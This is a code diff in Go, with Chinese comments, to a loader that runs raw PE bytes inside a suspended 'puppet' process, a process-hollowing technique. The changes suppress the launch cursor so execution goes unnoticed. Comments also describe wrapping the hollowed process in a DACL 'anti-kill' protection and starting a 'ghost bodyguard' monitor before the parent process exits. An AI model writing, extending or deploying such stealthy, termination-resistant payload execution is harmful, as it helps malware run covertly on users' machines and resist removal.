@@ -10,10 +10,11 @@ import (
 )
 
 const (
-	CREATE_SUSPENDED       = 0x00000004
-	PAGE_EXECUTE_READWRITE = 0x40
-	MEM_COMMIT             = 0x1000
-	MEM_RESERVE            = 0x2000
+	CREATE_SUSPENDED        = 0x00000004
+	PAGE_EXECUTE_READWRITE  = 0x40
+	MEM_COMMIT              = 0x1000
+	MEM_RESERVE             = 0x2000
+	STARTF_FORCEOFFFEEDBACK = 0x00000080 // 🌟 新增：强制关闭新进程的系统启动反馈（拒绝鼠标转圈）
 )
 
 var (
@@ -21,12 +22,12 @@ var (
 	procCloseHandle        = kernel32.NewProc("CloseHandle")
 )
 
-// Execute 阻塞运行 PE 字节码，并返回进程退出码
+// Execute 阻塞运行 PE 字节码，并返回进程退出码 (供幽灵保镖监控使用)
 func Execute(targetPath string, payload []byte) (uint32, error) {
 	return executeInternal(targetPath, payload, true)
 }
 
-// 🌟 修改：ExecuteAsync 异步运行 PE 字节码，不再阻塞，并返回创建的进程 PID
+// ExecuteAsync 异步运行 PE 字节码，不阻塞 (供父进程献祭前秒启动保镖使用)
 func ExecuteAsync(targetPath string, payload []byte) (uint32, error) {
 	return executeInternal(targetPath, payload, false)
 }
@@ -48,6 +49,7 @@ func executeInternal(targetPath string, payload []byte, wait bool) (uint32, erro
 	var si STARTUPINFO
 	var pi PROCESS_INFORMATION
 	si.Cb = uint32(unsafe.Sizeof(si))
+	si.DwFlags = STARTF_FORCEOFFFEEDBACK // 🌟 核心修复点：赋值标志位，彻底消灭转圈等待！
 
 	ret, _, err := procCreateProcessW.Call(
 		uintptr(unsafe.Pointer(targetPtr)),
@@ -64,6 +66,7 @@ func executeInternal(targetPath string, payload []byte, wait bool) (uint32, erro
 	defer procCloseHandle.Call(uintptr(pi.Thread))
 	defer procCloseHandle.Call(uintptr(pi.Process))
 
+	// 为生成的傀儡进程立刻套上 DACL 防杀护甲
 	protect.ProtectProcessByHandle(pi.Process)
 
 	var pbi PROCESS_BASIC_INFORMATION
@@ -154,6 +157,5 @@ func executeInternal(targetPath string, payload []byte, wait bool) (uint32, erro
 		return exitCode, nil
 	}
 
-	// 🌟 返回新孵化进程的 PID
 	return pi.ProcessId, nil
 }
